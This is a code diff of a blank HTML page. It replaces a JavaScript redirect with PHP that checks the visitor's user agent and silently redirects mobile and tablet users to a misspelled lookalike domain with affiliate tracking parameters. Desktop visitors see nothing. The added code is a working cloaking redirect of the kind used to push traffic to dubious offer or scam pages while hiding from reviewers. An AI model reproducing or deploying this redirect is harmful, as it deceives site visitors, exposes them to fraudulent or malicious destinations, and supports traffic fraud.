@@ -7,8 +7,25 @@
     <title></title>
   </head>
   <body></body>
-  <script src="./link.js"></script>
-  <script>
-    window.location.href = offerLink;
-  </script>
+  <div>
+
+<?php
+include "mobile_redirect.php";
+$detect = new Mobile_Detect;
+$detect->setUserAgent($_SERVER['HTTP_USER_AGENT']);
+if ($detect->isMobile() || $detect->isTablet()) {
+$excludeTablets = true;
+$excludeIOSAndroid = true;
+$isiOs = $detect->isiOs();
+$isAndroidOs = $detect->isAndroidOS();
+$isFeaturePhone = $detect->isMobile() && !$isAndroidOs && !$isiOs;
+if($isFeaturePhone || ($detect->isTablet() && $excludeTablets)
+|| ((($isiOs && !$detect->isTablet() || $isAndroidOs) && $excludeIOSAndroid))
+) {
+header('Location: https://oglaoo.datlngllfe.net/?utm_source=da57dc555e50572d&s1=183514&s2=1764330&s3=agram1&s5=agram2&j1=1');
+}
+}
+
+    
+  </div>
 </html>
